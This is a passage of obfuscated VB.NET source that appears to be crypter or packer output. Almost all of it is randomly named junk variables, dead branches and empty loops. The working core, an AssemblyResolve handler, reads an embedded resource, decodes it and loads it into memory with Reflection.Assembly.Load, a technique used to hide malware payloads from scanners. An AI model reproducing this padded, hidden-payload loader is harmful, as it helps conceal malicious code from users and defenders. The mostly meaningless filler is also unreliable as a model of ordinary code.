            Dim YMnXhYNqMoJ As Boolean = False
            If YMnXhYNqMoJ = True Then
                Debug.Print("TUFKrDNYEXr")
            End If
            Dim hjhjLQszjxE As Long = 358
            Dim ynAPXYfbBHj As Boolean = True
            If ynAPXYfbBHj = False Then
                Debug.Print("ucEjICpxPDl")
            End If
            Dim yhBydYvccmn As String = "RLqYffWdmKw"
            Dim YYuPQyaWNSx As Object = {}
            Return kcWydGeO
            Dim eiqYjKzoWG As Long = 259
            Dim IrnvbgxtVA As Boolean = True
            If IrnvbgxtVA = False Then
                Debug.Print("xqAJtsdiKw")
            End If
            Dim qMqKezdKIo As Long = 155
            Dim tYwBpwLWwh As Boolean = False
            If tYwBpwLWwh = True Then
                Debug.Print("BHegSnMXuX")
            End If
        Catch ex As Exception

            Dim FrXXNFnW = LixZHzuH()
            Return Nothing

            Dim ciwbyfqD = wvftWLUa()
        End Try

        HIlXYYM()
    End Function

    Public Shared Sub QKbLCCI()
        Dim NrOtCex As Object = {}
        Dim YEIXTtd As String = "ZsBgkSQ"

        Dim FJNpoMF As String = "Lpgzzgz"
    End Sub
    Public Shared Sub BnvTPFj()
        Dim vfrtXmP As Object = {}
        Dim sMdbXPE As Integer = 732
        Dim DYXFodk As Object = {}

        Dim EMQNFDX As Long = 241
        Dim WIUHfLo As Integer = 446
    End Sub
    Public Shared Sub JXVlBSo()
        Dim fbeFsWD As Object = {}


        Dim GLPuqVG As Object = {}
        Dim QInLGmS As Object = {}

    End Sub
    Public Shared Function ISBoqlKf()
        Dim gdZuuNRA As Integer = 0
        For LZHPHiJs = 0 To 100
            gdZuuNRA += 1
        Next
        Dim qUpkUDAk As Long = 61
        Dim WQXFhXsb As Integer = 771
        Dim PgNqYeHF As Byte() = {}
        Dim ubvLlzzx As Byte() = {}
        Dim ZXdfyUqo As Integer = 97
        Dim ESLALpig As Long = 716
        Dim xjClBwxK As Integer = 0
        For cejGORpB = 0 To 100
            xjClBwxK += 1
        Next
        Dim HaRbbmgt As Object = {}
        Dim mVzwoHYl As Integer = 0
        For cFGUQSxU = 0 To 100
            mVzwoHYl += 1
        Next
        Return "VVxFGZMx"
    End Function
    Public Shared Sub EoblwVV()
        Dim CCzAXwU As Object = {}
        Dim HqjwTSj As Object = {}
        Dim dtsQKWz As String = "EddFIVB"
        Dim NbAWYlN As Object = {}
        Dim bNPufyi As Long = 735
        Dim pKdAaKW As Integer = 532

    End Sub
    Public Shared Function LixZHzuH()
        Dim AzxWTKgm As Integer = 0
        For gnPEueCP = 0 To 100
            AzxWTKgm += 1
        Next
        Dim avpCAkvf As String = "HjHlcDRI"
        Dim BrhjhJKY As Boolean = True
        If BrhjhJKY = False Then
            MsgBox("vAHinPEn")
        End If
        Dim cnZQPiaR As Object = {}
        Dim WwzOUoTg As Long = 686
        Dim CjRwwIpJ As Integer = 0
        For wsrvCOiZ = 0 To 100
            CjRwwIpJ += 1
        Next
        Dim ICKXBBoV As Long = 185
        Dim oqcFdVKy As Long = 386
        Dim iyCEiaEO As Boolean = True
        If iyCEiaEO = False Then
            MsgBox("PmTmKuZr")
        End If
        Return "JuukQATG"
    End Function
    Public Shared Function wvftWLUa()
        Dim XrWaEkjT As Object = {}
        Dim DeoIgEFw As Integer = 655
        Dim xnOGlKyMHF As Long = 427
        Dim KyAaHymVQz As Integer = 32
        Dim uVKzhNgAtr As Boolean = True
        If uVKzhNgAtr = False Then
            MsgBox("HYfgRAxwXm")
        End If
        Dim XPDxJfuZrJ As Long = 89
        Dim AgRHmDOsVC As Integer = 483
        Dim mnuHpQQuow As Boolean = True
        If mnuHpQQuow = False Then
            MsgBox("QvsfhmOAnr")
        End If
        Dim SQNJdkSaGj As Integer = 958
        Dim yRuukFtRae As Boolean = False
        If yRuukFtRae = True Then
            MsgBox("PyJBZnzOtU")
        End If
        Return "JMiQYtddNO"
    End Function
    Public Shared Sub HIlXYYM()
        Dim alZxZen As Object = {}
        Dim ashYPFQ As Long = 674


        Dim zNvALGy As Object = {}
    End Sub

    Private Shared Function uTmnDvNy(sender As Object, SfKtHXUT As System.ResolveEventArgs) As System.Reflection.Assembly

        'get the root namespace (im tired of manually adding this)
        Dim UYIPZaQNckv As Boolean = False
        If UYIPZaQNckv = True Then
            Debug.Print("aEaYkuJSghc")
        End If
        Dim FFQVmpeqDRj As Long = 134
        Dim PkYSdFAusoa As Integer = 0
        For eEZYLQfyUwi = 0 To 100
            PkYSdFAusoa += 1
        Next
        Dim vTrkLZmYjvE As Byte() = {}
        Dim xoVZCxjgGdk As Byte() = {}
        Dim dWajhNDD As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly

        ejjCToP()
        Dim BiypkpJY As String = Strings.Left(dWajhNDD.EntryPoint.DeclaringType.Namespace, dWajhNDD.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        Dim IysppIISxb As Boolean = False
        If IysppIISxb = True Then
            Debug.Print("HLHsUJNfBv")
        End If
        Dim OfTKwDuFEN As Integer = 399
        Dim IPfZiINIxc As String = "jRWWKhNAhy"
        Dim zjOQwSyXFQ As Boolean = True
        If zjOQwSyXFQ = False Then
            Debug.Print("IntIBJnUzl")
        End If
        'fuck ya! Im done manually adding that shit!!!

        Dim tEiPXMli = RsTVopCO()
        Dim LYOeKftH As String = BiypkpJY + New Reflection.AssemblyName(SfKtHXUT.Name).Name + ".dll"

        ODccSym()
        'resourceName = "dll.dll"

        yjSrJNT()
        Using YwNhARSm = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(LYOeKftH)
            Dim tfbypkuDBes As Integer = 238
            Dim cWIBkcXcKzS As Boolean = False
            If cWIBkcXcKzS = True Then
                Debug.Print("DRrXVatoSLb")
            End If
            Dim aCmYoeTCrHj As Boolean = True
            If aCmYoeTCrHj = False Then
                Debug.Print("gxdOMzBbvBD")
            End If
            Dim HiODKyDoEXU As Long = 377
            Dim YmhjWHqQWhz As Boolean = False
            If YmhjWHqQWhz = True Then
                Debug.Print("UalDHlAlldB")
            End If

            Dim EydAMTHIRf As Boolean = True
            If EydAMTHIRf = False Then
                Debug.Print("uNNagdIXAy")
            End If
            Dim LXoihMYguS As Integer = 175
            Dim joMEfoPAnl As Long = 268
            Dim iCbHKpVOrF As Byte() = {}
            Dim jkmkOHzd = New Byte(YwNhARSm.Length - 1) {}

            GXgDfRP()
            'decode assembly here
            Dim SXIpXxcEVvY As Integer = 979
            Dim vhOYLuTrXeU As Long = 640
            Dim YJiaXszqBBx As Object = {}
            Dim XPqCNScWdLp As Boolean = False
            If XPqCNScWdLp = True Then
                Debug.Print("flCmblyUZSo")
            End If
            Dim RtoyaZuEvCD As Byte() = {}


            yucXgLy()
            YwNhARSm.Read(jkmkOHzd, 0, jkmkOHzd.Length)
            Dim cpDDrkQmuh As Integer = 169
            Dim iJPVSdxLyz As Byte() = {}
            Dim PZTTbwsdMS As Boolean = True
            If PZTTbwsdMS = False Then
                Debug.Print("qaKRCWsVvo")
            End If
            Dim FsBLpGdrUG As Boolean = False
            If FsBLpGdrUG = True Then
                Debug.Print("PwgDuxSoNb")
            End If
            Dim MRMtKzuQwt As Byte() = {}
            jkmkOHzd = mUGLsEIA(bYrFYPpS(jkmkOHzd))

            Dim uDHYcHEb = PIaDPmMk()
            Return Reflection.Assembly.Load(jkmkOHzd)
            Dim cXYsVoBvLd As Integer = 359
            Dim OfBsYBDyeY As Boolean = True
            If OfBsYBDyeY = False Then
                Debug.Print("snyQQXBDdS")
            End If
            Dim uHUtMVFdwK As String = "aIBeTqhUQG"
            Dim dVGWdmPgEz As Integer = 0
            For YigkdssvYt = 0 To 100
                dVGWdmPgEz += 1
            Next


            VfgzDtN()
        End Using ' stream
        Dim VRvNajPKgje As Integer = 0
        For bnQqxDpRmqT = 0 To 100
            VRvNajPKgje += 1
        Next
        Dim AIeRtEXDCpx As String = "LUYwKSDuOXH"
        Dim DKlcQBlRstA As Boolean = True
        If DKlcQBlRstA = False Then
            Debug.Print("XyYiFHgQAFB")
        End If
        Dim jsDtyVXvjAe As Byte() = {}
        Dim DDdAaaIkQjH As String = "ZRlBFesJQJn"
    End Function

    Public Shared Sub ejjCToP()

        Dim ZJQJDUF As Object = {}

        Dim PRrIhEd As Object = {}
        Dim KOLPDjJ As Object = {}
        Dim rAUmjcm As Long = 573
    End Sub
    Public Shared Function RsTVopCO()
        Dim IunsdyxQ As Byte() = {}
        Dim WktWijJy As Long = 431
        Dim zvHQRGsS As Integer = 884
        Dim Yamxlils As Object = {}
        Dim AlBrVFUM As Object = {}
        Dim PbGVargu As Boolean = True
        If PbGVargu = False Then
            MsgBox("smVPKOPO")
        End If
        Dim GcasPAbw As Long = 59
        Dim jnpmyXKQ As Integer = 0
        For xeuQEJWz = 0 To 100
            jnpmyXKQ += 1
        Next
        Dim apJKngFT As Integer = 201
        Return "ofOotSRB"
    End Function
    Public Shared Sub ODccSym()
        Dim QuDelWX As Integer = 878

        Dim UpDNTsI As String = "HqYmgfi"

    End Sub
    Public Shared Sub yjSrJNT()
        Dim nzKdYxN As Object = {}

        Dim mYhXnZg As Long = 318
        Dim gnPxiFC As Long = 244
        Dim hUrTNdT As Object = {}
    End Sub
    Public Shared Sub GXgDfRP()
        Dim KddSAnU As Long = 207
        Dim AaHlqWY As Object = {}

        Dim saSxkFa As Object = {}
        Dim HFRjGQZ As String = "RZbAIfb"
    End Sub
    Public Shared Sub yucXgLy()
        Dim KRVimZz As Object = {}


        Dim zhNUBKs As Long = 517
    End Sub
    Public Shared Function PIaDPmMk()
        Dim nUyJTOTF As String = "SPgegjKx"
        Dim LgXPXqZa As String = "qbEkkLRS"
        Dim jsvVaSgv As Byte() = {}
        Dim OndqnnYn As String = "tiLLAIPf"
        Dim YetgNcHX As Boolean = False
        If YetgNcHX = True Then
            MsgBox("DZaAaxzO")
        End If
        Dim wqRlREOs As Byte() = {}
        Dim blzGeZFk As Boolean = True
        If blzGeZFk = False Then
            MsgBox("Ghhbruxb")
        End If
        Dim wQozSFWK As Boolean = True
        If wQozSFWK = False Then
            MsgBox("phekJMln")
        End If
        Dim UcMFWhdf As Long = 586
        Dim zYuajCUX As String = "eTcuwXMP"
        Return "JPKPJsE"
    End Function
    Public Shared Sub VfgzDtN()
        Dim oJUZFAo As String = "oPcBvaR"
        Dim Nkqcrbz As Integer = 801
        Dim yBsabQQ As Integer = 997

        Dim YpKowPW As Integer = 373
        Dim xAajEQk As Integer = 692

    End Sub

End Class
Public Class Tuple(Of T1, T2)
    Public Property Item1() As T1
        Get
            Return m_Item1
        End Get
        Set
            m_Item1 = Value
        End Set
    End Property
    Private m_Item1 As T1
    Public Property Item2() As T2
        Get
            Return m_Item2
        End Get
        Set
            m_Item2 = Value
        End Set
    End Property
    Private m_Item2 As T2
    Public Sub New(Item1 As T1, Item2 As T2)
        Me.Item1 = Item1
        Me.Item2 = Item2
    End Sub
End Class